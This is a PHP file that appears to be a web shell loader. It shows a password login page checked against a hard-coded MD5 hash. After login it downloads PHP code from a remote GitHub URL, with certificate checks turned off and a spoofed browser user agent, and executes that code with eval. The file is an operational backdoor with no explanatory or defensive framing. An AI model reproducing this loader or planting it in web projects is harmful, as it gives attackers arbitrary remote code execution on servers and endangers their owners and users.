<?php
session_start();

// Function to display the login form
function display_login_form($errorMessage = '') {
    echo '<style>
            body {
                font-family: Arial, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                background-color: #f0f0f0;
            }
            form {
                background-color: #ffffff;
                padding: 20px;
                border: 1px solid #dddddd;
                border-radius: 5px;
                box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            }
            label {
                display: block;
                margin-bottom: 8px;
                font-weight: bold;
            }
            input[type="password"], input[type="submit"] {
                width: 100%;
                padding: 8px;
                margin-bottom: 10px;
                border: 1px solid #cccccc;
                border-radius: 4px;
            }
            input[type="submit"] {
                background-color: #4CAF50;
                color: white;
                cursor: pointer;
            }
            input[type="submit"]:hover {
                background-color: #45a049;
            }
            .error {
                color: red;
                font-weight: bold;
                margin-bottom: 10px;
            }
          </style>
          <form method="post">';

    if (!empty($errorMessage)) {
        echo '<p class="error">' . $errorMessage . '</p>';
    }

    echo '<label for="password">Password:</label>
          <input type="password" name="password" id="password" required>
          <input type="submit" value="Login">
          </form>';
    exit;
}

// Function to get URL content
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

// Logout functionality
if (isset($_GET['logout'])) {
    unset($_SESSION['loggedin']);
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit();
}

// Check if the user is logged in before executing the content
if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    echo '<a href="?logout=true">Logout</a>'; // Display logout link
    $a = geturlsinfo('https://raw.githubusercontent.com/1310NG1337/sasa/main/m-aja.php');
    eval('?>' . $a);
} else {
    // Handle login attempt
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        $hashedPassword = '936bed245510a8da696bbf93309e7a2a';
        if (md5($_POST['password']) === $hashedPassword) {
            $_SESSION['loggedin'] = true; // Set session logged in
            header("Location: " . $_SERVER['PHP_SELF']);
            exit();
        } else {
            display_login_form('Invalid password!');
        }
    } else {
        display_login_form();
    }
}
?>
